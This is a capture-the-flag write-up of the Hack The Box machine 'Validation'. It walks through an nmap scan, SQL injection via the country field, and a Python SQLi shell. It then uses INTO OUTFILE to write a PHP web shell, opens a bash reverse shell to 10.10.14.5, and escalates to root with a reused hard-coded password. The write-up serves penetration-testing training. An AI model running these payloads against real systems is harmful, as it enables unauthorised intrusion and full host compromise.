# Validation (Easy - Linux)

## Recon
### Nmap
```console
# nmap -Pn --open -sC -sV -p- 10.10.11.116 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 22:56 EST
Nmap scan report for 10.10.11.116
Host is up (0.022s latency).
Not shown: 65522 closed ports, 9 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Access
### Second Order SQLi
Payload
```
POST / HTTP/1.1
Host: 10.10.11.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.10.11.116
Connection: close
Referer: http://10.10.11.116/
Upgrade-Insecure-Requests: 1

username=bigb0ss&country=Brazil'
```

HTTP Response
```html
<p>Welcome bigb0ss
Other Players In Brazil'

Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33
</p>
```

### Union-based SQLi
- Querying user

Payload
```
username=test&country=Brazil'+union+select+user()%3b--+-
```

HTTP Response
```
<li class='text-white'>uhc@localhost</li>
```

SQLi Script
```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Term(Cmd):

    prompt = "sqli> "

    def default(self, args):
        url = "http://10.10.11.116/"
        username = "bigb0ss"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = {
            "username": username, 
            "country": f"' union {args};-- -",
        }
        
        r = requests.post(url, headers=headers, data=data)

        output = BeautifulSoup(r.text, 'html.parser')

        if output.li:
            print('\n'.join([x.text for x in output.findAll('li')]))

    def quit(self, args):
        return 1

term = Term()
term.cmdloop()
```

```console
$ python3 sqli.py 
sqli> select user()
uhc@localhost
sqli> select database()
registration
```

### SQLi --> Webshell
Writing a file to the server was allowed, too: 
```console
sqli> select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/bigb0ss.php'
```

```console
# curl http://10.10.11.116/bigb0ss.php --data-urlencode 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Getting a reverse shell from the webshell:
```console
# curl http://10.10.11.116/bigb0ss.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"'
```

```console
# nc -lvnp 9001                           
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.116] 34842
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### user.txt
```console
www-data@validation:/home$ cd htb
cd htb
www-data@validation:/home/htb$ ls
ls
user.txt
www-data@validation:/home/htb$ cat user.txt
cat user.txt
370b__REDACTED__f8382
```

## Privesc (www-data --> root)

A stored hard-cded password led us to get root access to the box:
```console
www-data@validation:/home/htb$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

### root.txt
```console
www-data@validation:/home/htb$ su -
su -
Password: uhc-9qual-global-pw

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
8d09__REDACTED__4147
```

